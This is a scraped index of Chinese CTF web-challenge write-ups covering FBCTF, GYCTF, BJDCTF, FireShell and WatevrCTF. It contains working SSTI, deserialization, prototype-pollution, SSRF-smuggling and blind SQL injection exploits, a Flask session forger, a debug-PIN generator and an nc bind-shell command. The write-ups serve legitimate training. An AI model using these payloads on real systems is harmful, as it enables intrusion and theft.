"},"buuoj/fbctf-2019.html":{"url":"buuoj/fbctf-2019.html","title":"FBCTF 2019","keywords":"","body":"FBCTF 2019RCEServiceEventFBCTF 2019 RCEService 利用点：1. preg_match 换行绕过 2.prce 最大回溯限制 Event 看cookie三段的，试了一下jwt发现含用户名字段，但是签名对不上 想办法伪造cookie event_important存在注入回显点 __dict__ __class__.__init__.__globals__[app].config 拿到secretkey后伪造admin身份 fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y 检验下正确性 python flask_session_cookie_manager2.py decode -s 'fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y' -c Ilx1MWQyY2RtaW4i.XogtiQ.GS-obKTyVRDwhI_27cLwIgxGrsc ᴬdmin 然后用脚本签名 from flask import Flask from flask.sessions import SecureCookieSessionInterface app = Flask(__name__) app.secret_key = b'fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y' session_serializer = SecureCookieSessionInterface().get_signing_serializer(app) @app.route('/') def index(): print(session_serializer.dumps(\"admin\")) index() 注意使用python3 © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"buuoj/gyctf-2020.html":{"url":"buuoj/gyctf-2020.html","title":"GYCTF 2020","keywords":"","body":"GYCTF 2020FlaskApp参考资料EasyphpEz_Express参考资料Node GameEasyThinking参考资料GYCTF 2020 FlaskApp 进入是个Flask的base64加密解密页面 考虑SSTI咯 试了一下base64decode(base64encode({{1+1}}))会返回2 然后就开始找 {{().__class__.__bases__[0].__subclasses__()[0].__init__}} ` 哪个被重载发现75可以用 结果 ： &lt;function _ModuleLock.__init__ at 0x7f070fc12290&gt; 然后就是__globals__.__builtins__[] 发现eval不能用,用open可以读,但是似乎flag也被过滤了， {{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['open'](\"/etc/passwd\").read()}} 这个时候也发现存在报错界面，提示了是在调试模式，考虑拿Flask的PIN 需要拿到： username:就是启动这个Flask的用户 modname为flask.app getattr(app, 'name', getattr(app.class, 'name'))为Flask getattr(mod, 'file', None)为flask目录下的一个app.py的绝对路径 uuid.getnode()就是当前电脑的MAC地址，str(uuid.getnode())则是mac地址的十进制表达式 get_machine_id() /etc/machine-id或者 /proc/sys/kernel/random/boot_i中的值 假如是在win平台下读取不到上面两个文件，就去获取注册表中SOFTWARE\\Microsoft\\Cryptography的值 假如是Docker机 那么为 /proc/self/cgroup docker行 通过open().read()拿到这些值 username: flaskweb // /etc/passwd modname: flask.app getattr(app, '__name__', getattr(app.__class__, '__name__')):Flask getattr(mod, '__file__', None): /usr/local/lib/python3.7/site-packages/flask/app.py //报错信息 uuid.getnode(): str(02:42:ae:01:17:04)=2485410404100 // /sys/class/net/eth0/address get_machine_id(): b7372b2e7d533d8845c8f8d5aa5086ad9f8d5e16693d990ffe49ed4f55c190fd // /proc/self/cgroup 跑脚本 import hashlib from itertools import chain probably_public_bits = [ 'flaskweb', 'flask.app', 'Flask', '/usr/local/lib/python3.7/site-packages/flask/app.py', ] private_bits = [ '2485410404100', 'b7372b2e7d533d8845c8f8d5aa5086ad9f8d5e16693d990ffe49ed4f55c190fd' ] h = hashlib.md5() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit) h.update(b'cookiesalt') cookie_name = '__wzd' + h.hexdigest()[:20] num = None if num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9] rv =None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = num print(rv) 然后在报错界面就可以执行任意代码了 import os os.popen(\"ls /\").read() 参考资料 Flask debug pin安全问题： https://xz.aliyun.com/t/2553 Easyphp 扫目录可以扫出源码www.zip 考察POP链+尾部逃逸 首先是很明显的尾部逃逸 function safe($parm){ $array= array('union','regexp','load','into','flag','file','insert',\"'\",'\\\\',\"*\",\"alter\"); return str_replace($array,'hacker',$parm); } class User{ ... public function getNewInfo(){// $age=$_POST['age']; $nickname=$_POST['nickname'];//可以构造 len(payload)*\"union\"+payload 来覆盖Ctrl return safe(serialize(new Info($age,$nickname))); } ... } 这就造成nickname可控，然后找POP链 id=$mysqli->login('select id,password from user where username=?'); if($this->id){ $_SESSION['id']=$this->id; $_SESSION['login']=1; echo \"你的ID是\".$_SESSION['id']; echo \"你好！\".$_SESSION['token']; echo \"window.location.href='./update.php'\"; return $this->id; } } } public function update(){//0getNewinfo());//5-> $age=$Info->age; $nickname=$Info->nickname; $updateAction=new UpdateHelper($_SESSION['id'],$Info,\"update user SET age=$age,nickname=$nickname where id=\".$_SESSION['id']);//4-> //这个功能还没有写完 先占坑 } public function getNewInfo(){//5 } public function __destruct(){ return file_get_contents($this->nickname);//危 //没得输出利用 } public function __toString()//3nickname->update($this->age);//1-> (nickname = Info) return \"0-0\"; } } class Info{ public $age; public $nickname; public $CtrlCase; public function __construct($age,$nickname){ $this->age=$age; $this->nickname=$nickname; } public function __call($name,$argument){//1CtrlCase->login($argument[0]);//2-> (CtrlCase Login) age=sql } } Class UpdateHelper{ public $id; public $newinfo; public $sql; public function __construct($newInfo,$sql){ $newInfo=unserialize($newInfo); $upDate=new dbCtrl(); } public function __destruct()//4sql;//3-> (__toStrings()) sql = User } } class dbCtrl { public $hostname=\"127.0.0.1\"; public $dbuser=\"root\"; public $dbpass=\"root\"; public $database=\"test\"; public $name; public $password; public $mysqli; public $token; public function __construct() { $this->name=$_POST['username']; $this->password=$_POST['password']; $this->token=$_SESSION['token']; } public function login($sql) { $this->mysqli=new mysqli($this->hostname, $this->dbuser, $this->dbpass, $this->database); if ($this->mysqli->connect_error) { die(\"连接失败，错误:\" . $this->mysqli->connect_error); } $result=$this->mysqli->prepare($sql); $result->bind_param('s', $this->name); $result->execute(); $result->bind_result($idResult, $passwordResult); $result->fetch(); $result->close(); if ($this->token=='admin') { return $idResult; } if (!$idResult) { echo('用户不存在!'); return false; } if (md5($this->password)!==$passwordResult) { echo('密码错误！'); return false; } $_SESSION['token']=$this->name; return $idResult; } public function update($sql) { //还没来得及写 } } 分析源码从update.php中update()传入(0)构造一个可控的$Info(5),如果我们想要传入可控的的sql的话，可以把CtrlCase搞成UpdateHelper销毁时调用__destruct()(4)这时候如果$sql是User那么触发__toString()(3)如果nickname = Info则触发(1)然后CtrlCase为一个dbCtrl则可以执行sql也即$age(2) 然后可以根据POP链写出初步的Exp mysqli=new mysqli($this->hostname, $this->dbuser, $this->dbpass, $this->database); if ($this->mysqli->connect_error) { die(\"连接失败，错误:\" . $this->mysqli->connect_error); } $result=$this->mysqli->prepare($sql); $result->bind_param('s', $this->name); $result->execute(); $result->bind_result($idResult, $passwordResult); $result->fetch(); $result->close(); if ($this->token=='admin') { return $idResult; } if (!$idResult) { echo('用户不存在!'); return false; } if (md5($this->password)!==$passwordResult) { echo('密码错误！'); return false; } $_SESSION['token']=$this->name; return $idResult; } } $dbc= new dbCtrl(); class Info{ public $age; public $nickname; public $CtrlCase; public function __construct($age,$nickname){ $this->age=$age; $this->nickname=$nickname; } } $info=new Info(\"233\",\"233\"); $info->CtrlCase = $dbc; class User { public $id; public $age; public $nickname; } $usr = new User(); $usr->age =\"select password,id from user where username=?\"; $usr->nickname=$info; Class UpdateHelper{ public $id; public $newinfo; public $sql; public function __construct($newInfo,$sql){ $newInfo=unserialize($newInfo); $upDate=new dbCtrl(); } } $upd = new UpdateHelper(\"233\",\"233\"); $upd->sql = $usr; $info2=new Info(\"1\",\"233\"); $info2->CtrlCase=$upd; echo serialize($info2); //O:4:\"Info\":3:{s:3:\"age\";s:1:\"1\";s:8:\"nickname\";s:3:\"233\";s:8:\"CtrlCase\";O:12:\"UpdateHelper\":3:{s:2:\"id\";N;s:7:\"newinfo\";N;s:3:\"sql\";O:4:\"User\":3:{s:2:\"id\";N;s:3:\"age\";s:45:\"select password,id from user where username=?\";s:8:\"nickname\";O:4:\"Info\":3:{s:3:\"age\";s:3:\"233\";s:8:\"nickname\";s:3:\"233\";s:8:\"CtrlCase\";O:6:\"dbCtrl\":8:{s:8:\"hostname\";s:9:\"127.0.0.1\";s:6:\"dbuser\";s:4:\"root\";s:6:\"dbpass\";s:4:\"root\";s:8:\"database\";s:4:\"test\";s:4:\"name\";s:5:\"admin\";s:8:\"password\";N;s:6:\"mysqli\";N;s:5:\"token\";s:5:\"admin\";}}}}} ?> payload=\"\"\"\";s:8:\"CtrlCase\";O:12:\"UpdateHelper\":3:{s:2:\"id\";N;s:7:\"newinfo\";N;s:3:\"sql\";O:4:\"User\":3:{s:2:\"id\";N;s:3:\"age\";s:45:\"select password,id from user where username=?\";s:8:\"nickname\";O:4:\"Info\":3:{s:3:\"age\";s:3:\"233\";s:8:\"nickname\";s:3:\"233\";s:8:\"CtrlCase\";O:6:\"dbCtrl\":8:{s:8:\"hostname\";s:9:\"127.0.0.1\";s:6:\"dbuser\";s:4:\"root\";s:6:\"dbpass\";s:4:\"root\";s:8:\"database\";s:4:\"test\";s:4:\"name\";s:5:\"admin\";s:8:\"password\";N;s:6:\"mysqli\";N;s:5:\"token\";s:5:\"admin\";}}}}}\"\"\" \"union\"*len(payload)+payload 利用尾部逃逸搞一个这样的Info \"union\"*len(payload)+payload 然后拿到密码md5,这里可以反查出来，当然既然可以任意sql的话还可以直接注, Ez_Express www.zip源码泄露 发现是js写的 涉及到JStoUpperCase()的安全性问题 利用ı->I 绕过注册 admin function safeKeyword(keyword) { if(keyword.match(/(admin)/is)) { return keyword } return undefined } req.session.user={ 'user':req.body.userid.toUpperCase(), 'passwd': req.body.pwd, 'isLogin':false } 然后可以post到action这里又涉及到js原型链污染 利用merge,clone 污染这里的outputFunctionName router.get('/', function (req, res) { if (!req.session.user) { res.redirect('/login'); } res.outputFunctionName = undefined; res.render('index', data = {'user': req.session.user.user}); }); Content-Type转成 application/json payload: {\"lua\":\"a\",\"__proto__\":{\"outputFunctionName\":\"a=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag')//\"},\"Submit\":\"\"} 参考资料 javascript-up-low-ercase-tip: http://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html 从杭电hgame-week4学原型链污染: https://www.jianshu.com/p/6e623e9debe3 深入理解 JavaScript Prototype 污染攻击 https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html Node Game 给了源码 var express = require('express'); var app = express(); var fs = require('fs'); var path = require('path'); var http = require('http'); var pug = require('pug'); var morgan = require('morgan'); const multer = require('multer'); app.use(multer({dest: './dist'}).array('file')); app.use(morgan('short')); app.use(\"/uploads\",express.static(path.join(__dirname, '/uploads'))) app.use(\"/template\",express.static(path.join(__dirname, '/template'))) app.get('/', function(req, res) { var action = req.query.action?req.query.action:\"index\"; if( action.includes(\"/\") || action.includes(\"\\\\\") ){ res.send(\"Errrrr, You have been Blocked\"); } file = path.join(__dirname + '/template/'+ action +'.pug'); var html = pug.renderFile(file); res.send(html); }); app.post('/file_upload', function(req, res){ var ip = req.connection.remoteAddress; var obj = { msg: '', } if (!ip.includes('127.0.0.1')) { obj.msg=\"only admin's ip can use it\" res.send(JSON.stringify(obj)); return } fs.readFile(req.files[0].path, function(err, data){ if(err){ obj.msg = 'upload failed'; res.send(JSON.stringify(obj)); }else{ var file_path = '/uploads/' + req.files[0].mimetype +\"/\"; var file_name = req.files[0].originalname var dir_file = __dirname + file_path + file_name if(!fs.existsSync(__dirname + file_path)){ try { fs.mkdirSync(__dirname + file_path) } catch (error) { obj.msg = \"file type error\"; res.send(JSON.stringify(obj)); return } } try { fs.writeFileSync(dir_file,data) obj = { msg: 'upload success', filename: file_path + file_name } } catch (error) { obj.msg = 'upload failed'; } res.send(JSON.stringify(obj)); } }) }) app.get('/source', function(req, res) { res.sendFile(path.join(__dirname + '/template/source.txt')); }); app.get('/core', function(req, res) {//这里可以进行SSRF var q = req.query.q; var resp = \"\"; if (q) { var url = 'http://localhost:8081/source?' + q console.log(url) var trigger = blacklist(url); if (trigger === true) { res.send(\"error occurs!\"); } else { try { http.get(url, function(resp) { resp.setEncoding('utf8'); resp.on('error', function(err) { if (err.code === \"ECONNRESET\") { console.log(\"Timeout occurs\"); return; } }); resp.on('data', function(chunk) { try { resps = chunk.toString(); res.send(resps); }catch (e) { res.send(e.message); } }).on('error', (e) => { res.send(e.message);}); }); } catch (error) { console.log(error); } } } else { res.send(\"search param 'q' missing!\"); } }) function blacklist(url) { var evilwords = [\"global\", \"process\",\"mainModule\",\"require\",\"root\",\"child_process\",\"exec\",\"\\\"\",\"'\",\"!\"]; var arrayLen = evilwords.length; for (var i = 0; i 这里考察Node 8.12.0 以下的 SSRF 思想和CRLF类似 可以参考 https://xz.aliyun.com/t/2894#toc-2 利用nodejs低位拆分的处理 Exp: import urllib.parse import requests payload = ''' HTTP/1.1 Host: x Connection: keep-alive POST /file_upload HTTP/1.1 Content-Type: multipart/form-data; boundary=--------------------------919695033422425209299810 Connection: keep-alive cache-control: no-cache Host: x Content-Length: 290 ----------------------------919695033422425209299810 Content-Disposition: form-data; name=\"file\"; filename=\"eki.pug\" Content-Type: /../template doctype html html head style include ../../../../../../../flag.txt ----------------------------919695033422425209299810-- GET /flag HTTP/1.1 Host: x Connection: close x:''' payload = payload.replace(\"\\n\", \"\\r\\n\") payload = ''.join(chr(int('0xff' + hex(ord(c))[2:].zfill(2), 16)) for c in payload) print(payload) r = requests.get('http://4dc2eead-14ed-41d0-8846-474af06a6886.node3.buuoj.cn/core?q=' + urllib.parse.quote(payload)) print(r.text) 执行后pug文件就上传到template文件夹里并且读取了flag.txt EasyThinking 题目提示search功能有漏洞 存在源码泄露拿到www.zip Thinkphp6.0框架，看下search部分逻辑 //\\app\\home\\controller\\member.php public function search() { if (Request::isPost()){ if (!session('?UID')) { return redirect('/home/member/login'); } $data = input(\"post.\"); $record = session(\"Record\"); if (!session(\"Record\")) { session(\"Record\",$data[\"key\"]); } else { $recordArr = explode(\",\",$record); $recordLen = sizeof($recordArr); if ($recordLen >= 3){ array_shift($recordArr); session(\"Record\",implode(\",\",$recordArr) . \",\" . $data[\"key\"]); return View::fetch(\"result\",[\"res\" => \"There's nothing here\"]); } } session(\"Record\",$record . \",\" . $data[\"key\"]); return View::fetch(\"result\",[\"res\" => \"There's nothing here\"]); }else{ return View(\"search\"); } } 这里涉及到对Session的处理,最外层包装如下 function session($name = '', $value = '') { if (is_null($name)) { // 清除 Session::clear(); } elseif ('' === $name) { return Session::all(); } elseif (is_null($value)) { // 删除 Session::delete($name); } elseif ('' === $value) { // 判断或获取 return 0 === strpos($name, '?') ? Session::has(substr($name, 1)) : Session::get($name); } else { // 设置 Session::set($name, $value); } } 利用点就是这个Session来实现任意文件操作具体原理可以参考参考资料 Poc POST /home/member/search HTTP/1.1 Host: 7e20a6ce-de3e-465a-b62d-a02eaf89f174.node3.buuoj.cn Content-Length: 23 Cache-Control: max-age=0 Origin: http://7e20a6ce-de3e-465a-b62d-a02eaf89f174.node3.buuoj.cn Upgrade-Insecure-Requests: 1 DNT: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://7e20a6ce-de3e-465a-b62d-a02eaf89f174.node3.buuoj.cn/home/member/search Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: _ga=GA1.2.1470039898.1585919433; PHPSESSID=4ed89a20be1a7ec91b09e116cdc5.php Connection: close key= thinkphp6 会默认在 /runtime/session 创建一个sess_xxx格式的session文件，这里的xxx就是PHPSESSID（必须是32位）,而文件的内容就是session的内容,此处可以向key里注入 注意创建session的条件是要登陆成功，所以我们可以携带xxxx.php的phpsession进行登录，然后搜索注入 根据phpinfo()可以看到disable了大部分函数，利用bypass disable_function的脚本绕过 参考资料 thinkPHP6 任意文件操作漏洞分析 https://paper.seebug.org/1114/ © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"buuoj/bjd-2nd.html":{"url":"buuoj/bjd-2nd.html","title":"BJDCTF 2nd","keywords":"","body":"BJD 2ndfakegoogleoldhackduangshell简单注入假猪套天下第一XSS之光Schrödingerelementmaster文件探测EasyAspDotNetBJD 2nd fakegoogle ssti 直接搞 {{ config.__class__.__init__.__globals__['os'].popen('ls').read() }} oldhack tp5的一个RCE duangshell 一直想怎么反弹shell 后来被提醒了其实可以正向搞shell 正向弹 靶机： nc -lvvp 2333 -e /bin/bash 攻击机 nc ip 2333 简单注入 sql在hint.txt里给出了 select * from users where username='$_POST[\"username\"]' and password='$_POST[\"password\"]'; 拦截了= ' \" select poc username=\\&password=or 1# Exp: #coding=utf-8 # 过滤 = select ' import requests import threading import string url=\"http://3ff31987-f21d-4232-b55e-098ceb490cf7.node3.buuoj.cn/\" #sql=\"select(group_concat(username))from(admin)\" #sql=\"select(group_concat(password))from(admin)\" #sql=\"select(group_concat(column_name))from(information_schema.columns)where(table_name='contents')\" #sql=\"select(group_concat(content))from(contents)\" #sql=\"select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())\" #sql=\"database()\" #Result:p3rh4ps #sql=\"select(group_concat(table_name))from(information_schema.tables)where(table_schema like 0x70337268347073)\" sql=\"password\" #Result:OhyOuFOuNit #sql=\"username\" #Result:admin #Result:id,username,password #sql=\"select(group_concat(password))from(F1naI1y)\" #sql=\"select(group_concat(password))from(users)\" #sql=\"select(group_concat(username))from(admin)\" # Result:b210a7ad,503b791 #sql=\"select(group_concat(password))from(admin)\" # Result:cd27c5c0,c5bbaf1 #sql=\"select(group_concat(column_name))from(information_schema.columns)where(table_name='contents')\" Result:id,title,content,is_gnable #sql=\"select load_file('/flag')\" ret='' def booltest(start,end): ret=\"\" for i in range(start,end): l=1 r=255 while(l+1{2})^0#\".format(sql,i,mid) #payload=\"or 0^((ascii(substr((version()),1,1)))>2)^0#\" #payload=\"if((ascii(substr(({0}),{1},1)))>{2},1,0)\".format(sql,i,mid) #payload=\"union select * from images where id=if((ascii(substr(({0}),{1},1)))>{2},1,0)#\".format(sql,i,mid) #print payload #param = { # \"id\":payload, #} data = { \"username\":\"\\\\\", \"password\":payload, } #print chr(mid) #print req=requests.post(url,data=data) if (req.status_code != requests.codes.ok): continue #print req.text if (\"stronger\" in req.text): l=mid else : r=mid if chr(r) not in string.printable: break ret=ret+chr(r) print(threading.current_thread().name+\"working:\"+ret) print(threading.current_thread().name+\"Final:\"+ret) thr1 = threading.Thread(target=booltest, args=(1, 15),name=\"1\") thr2 = threading.Thread(target=booltest, args=(13, 20),name=\"2\") thr3 = threading.Thread(target=booltest, args=(21, 30),name=\"3\") thr4 = threading.Thread(target=booltest, args=(31, 40),name=\"4\") thr1.start() thr2.start() thr3.start() thr4.start() 假猪套天下第一 302跳转会泄露L0g1n.php,DS_Store也有 Payload: GET /L0g1n.php HTTP/1.1 Host: node3.buuoj.cn:26256 Cache-Control: max-age=10000000000000000 DNT: 1 Upgrade-Insecure-Requests: 1 User-Agent: Commodore 64 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: track_uuid=24fa757a-273e-49ed-bbc3-dd363e840ac9; PHPSESSID=7o5ms18nndg45n3339g419ioo0; time=900584929759 Client-IP: 127.0.0.1 Referer: gem-love.com Date: Sat,29 Oct 2119 19:43:31 GMT If-Modified-Since: Sat,29 Oct 2119 19:43:31 GMT If-Unmodified-Since: Sat,29 Oct 2119 19:43:31 GMT From: root@gem-love.com Via: y1ng.vip Connection: close ...一开始眼瞎没看到cookie里面的time,吧能加的时间头加了都没用... XSS之光 .git泄露拿到 利用php原生类反序列化搞xss 参考链接: https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html Poc alert(1)\"); $b = serialize($a); echo urlencode($b); Schrödinger html有个test.php 刚好可以爆破。。。 然后发现rate是前端算的。。。 cookie存了开始爆破的时间戳 然后就可以让他等于100% 拿到password elementmaster html 里有奇怪的东西 I am the real Element Masterrr!!!!!! @颖奇L'Amore 跑这个 #coding=utf-8 import requests periodic_table = ('H', 'He', 'Li', 'Be', 'B', 'C', 'N', 'O', 'F', 'Ne', 'Na', 'Mg', 'Al', 'Si', 'P', 'S', 'Cl', 'Ar', 'K', 'Ca', 'Sc', 'Ti', 'V', 'Cr', 'Mn', 'Fe', 'Co', 'Ni', 'Cu', 'Zn', 'Ga', 'Ge', 'As', 'Se', 'Br', 'Kr', 'Rb', 'Sr', 'Y', 'Zr', 'Nb', 'Mo', 'Te', 'Ru', 'Rh', 'Pd', 'Ag', 'Cd', 'In', 'Sn', 'Sb', 'Te', 'I', 'Xe', 'Cs', 'Ba', 'La', 'Ce', 'Pr', 'Nd', 'Pm', 'Sm', 'Eu', 'Gd', 'Tb', 'Dy', 'Ho', 'Er', 'Tm', 'Yb', 'Lu', 'Hf', 'Ta', 'W', 'Re', 'Os', 'Ir', 'Pt', 'Au', 'Hg', 'Tl', 'Pb', 'Bi', 'Po', 'At', 'Rn', 'Fr', 'Ra', 'Ac', 'Th', 'Pa', 'U', 'Np', 'Pu', 'Am', 'Cm', 'Bk', 'Cf', 'Es', 'Fm','Md', 'No', 'Lr', 'Rf', 'Db', 'Sg', 'Bh', 'Hs', 'Mt', 'Ds', 'Rg', 'Cn', 'Nh', 'Fl', 'Mc', 'Lv', 'Ts', 'Og', 'Uue') url=\"http://88105434-0b87-4a2b-8b5d-e18efd01faa5.node3.buuoj.cn/\" for element in periodic_table: req=requests.get(url+element+\".php\") if(req.status_code!=requests.codes.ok): continue print req.text 文件探测 header里有hinthome.php 看这个url就想到LFI 拿到system.php alert('why you are here!');alert('fxck your scanner');alert('fxck you! get out!');\"; header(\"Refresh:0.1;url=index.php\"); die; } $str2 = '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Error:&nbsp;&nbsp;url invalid~$ '; $str3 = '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Error:&nbsp;&nbsp;damn hacker!~$ '; $str4 = '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Error:&nbsp;&nbsp;request method error~$ '; ?> File Detector File Detector 你知道目录下都有什么文件吗? 请输入你想检测文件内容长度的url 你希望以何种方式访问？GET？POST? 提交 @颖奇L'Amore var theForm = document.getElementById( 'theForm' ); new stepsForm( theForm, { onSubmit : function( form ) { classie.addClass( theForm.querySelector( '.simform-inner' ), 'hide' ); var messageEl = theForm.querySelector( '.final-message' ); form.submit(); messageEl.innerHTML = 'Ok...Let me have a check'; classie.addClass( messageEl, 'show' ); } } ); \"; echo $str1; if (!preg_match($filter1, $url) ){ die($str2); } if (preg_match($filter2, $url)) { die($str3); } if (!preg_match('/^GET/i', $method) && !preg_match('/^POST/i', $method)) { die($str4); } $detect = @file_get_contents($url, false); print(sprintf(\"$url method&content_size:$method%d\", $detect)); } ?> 顺便扫了一下网站目录 有robots.txt 还有flag.php admin.php 然而能拿到的只有system.php 根据源码逻辑 可以ssrf拿到admin.php p2=http://127.0.0.1:2333/admin.php p3=GET %s 403 Forbiddenonly 127.0.0.1 can access! You know what I mean right?your ip address is \" . $_SERVER['REMOTE_ADDR']; } $_SESSION['user'] = md5($_SERVER['REMOTE_ADDR']); if (isset($_GET['decrypt'])) { $decr = $_GET['decrypt']; if (Check()){ $data = $_SESSION['secret']; include 'flag_2sln2ndln2klnlksnf.php'; $cipher = aesEn($data, 'y1ng'); if ($decr === $cipher){ echo WHAT_YOU_WANT; } else { die('爬'); } } else{ header(\"Refresh:0.1;url=index.php\"); } } else { //I heard you can break PHP mt_rand seed mt_srand(rand(0,9999999)); $length = mt_rand(40,80); $_SESSION['secret'] = bin2hex(random_bytes($length)); } ?> 控制Session为空绕过 注意URLENCODE EasyAspDotNet 并不会ASP... 看师傅的WP了解了一下 HITCON CTF 2018 - Why so Serials https://xz.aliyun.com/t/3019 关键是利用Viewstate 也就是这一坨 https://www.runoob.com/aspnet/aspnet-viewstate.html 解码网站 http://viewstatedecoder.azurewebsites.net/ 解出来是这一坨 Format marker: FF Version marker: 01 Pair Pair \"-406050078\" Pair null ArrayList of 2 element(s): 3 Pair null ArrayList of 4 element(s): 1 Pair Pair ArrayList of 2 element(s): \"ImageUrl\" \"/ImgLoad.aspx?path=1.png\" null null 3 Pair Pair ArrayList of 2 element(s): \"Text\" \"You clicked me\" null null null 20 byte(s) left over, perhaps an HMACSHA1 signature? 然后我们想可以不可以篡改这里面的内容让他变成我们想要的东西呢 可以看到最后是有HMACSHA1对其完整性进行校验的 可以利用ysoserial https://github.com/pwntester/ysoserial.net 来伪造 按照这个教程 https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/ 拿到web.config里的validationkey就可以生成rce payload了 怎么拿web.config? 利用/ImgLoad.aspx?path=2.pngLFI © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"buuoj/fireshellctf-2020.html":{"url":"buuoj/fireshellctf-2020.html","title":"FireShellCTF 2020","keywords":"","body":"FireshellCTF2020CaasURL TO PDFCarScreenShooterFireshellCTF2020 Caas 还蛮有意思的，可以在线编译c/c++ 应该是调用服务器上gcc 编译的时候会出啥岔子呢 原题提示/flag 那么考虑能不能LFI #include试下 然后在报错信息里看到了flag URL TO PDF buuoj不能连外网么法看，这题复现的wp https://blog.shoebpatel.com/2020/03/23/FireShell-CTF-2020-Write-up/ 就是html转pdf的时的attachment 开个靶机然后设置一个这样的网页 Captain \"222\" 233 貌似是因为后端在转pdf的时候会执行html里的指令，然后把flag带出来了 然后用kali的pdfdetach分离出pdf里的attachment Car 一个基础XXE ScreenShooter 和URL TO PDF类似的思路 这里利用javascript去读 exp=new XMLHttpRequest;exp.onload=function(){document.write(this.responseText)};exp.open(\"GET\",\"file:///flag\");exp.send(); © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"buuoj/watevrctf-2019.html":{"url":"buuoj/watevrctf-2019.html","title":"WatervrCTF","keywords":"","body":"WatevrCTFSupercalcWatevrCTF Supercalc 点开一个计算器，首先有个session,暂时不知道是啥，排除php 然后尝试报错构造1/0 Traceback (most recent call last): File &#34;somewhere&#34;, line something, in something result = 1/0 ZeroDivisionError: division by zero 应该是python写的，那么考虑一下flask-session 能解码出来 python2 flask_session_cookie_manager2.py decode -c .eJxFjcEKwjAQRH9l2JNCofYa8KZ-gSeNhzRd7GKawCYqtfTfbUHw-GZ4MxP1kkvSkcx1Ip86JkMNauyoIlZNuvBZnefW-Qc2Q8oFyp5jgXchILhctsZG4CSBYSmngd89K1uqECQy1qT0Eu8VJP5pdbBs5Wco2KOpdzZeWNNBXpIlxeP6btD9EO2Iz1LTfJu_m04-Tg.XqjwZw.qiHhU59NlW8GurKNxrRZyQzJN3M {\"history\":[{\"code\":\"1 / 0\",\"error\":\"Traceback (most recent call last):\\n File \\\"somewhere\\\", line something, in something\\n result = 1/0\\nZeroDivisionError: division by zero\"}]} 暂时不知道怎么搞，去翻了一下源码... 发现计算器的eval进过ast的校验，直接ssti肯定是没戏的 但是我们可以利用#注释符来绕过检验，然后报错render的时候还是有机会ssti的 但是把下划线和引号都ban了,还是没法直接读 用config可以拿到secretkey了我们可以控制session 1/0#{{config}} Traceback (most recent call last): File \"somewhere\", line something, in something result = 1/0#&lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;: None, &#39;SECRET_KEY&#39;: &#39;cded826a1e89925035cc05f0907855f7&#39;, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(31), &#39;USE_X_SENDFILE&#39;: False, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: &#39;/&#39;, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: False, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_COOKIE_SAMESITE&#39;: None, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: datetime.timedelta(0, 43200), &#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;JSON_AS_ASCII&#39;: True, &#39;JSON_SORT_KEYS&#39;: True, &#39;JSONIFY_PRETTYPRINT_REGULAR&#39;: False, &#39;JSONIFY_MIMETYPE&#39;: &#39;application/json&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None, 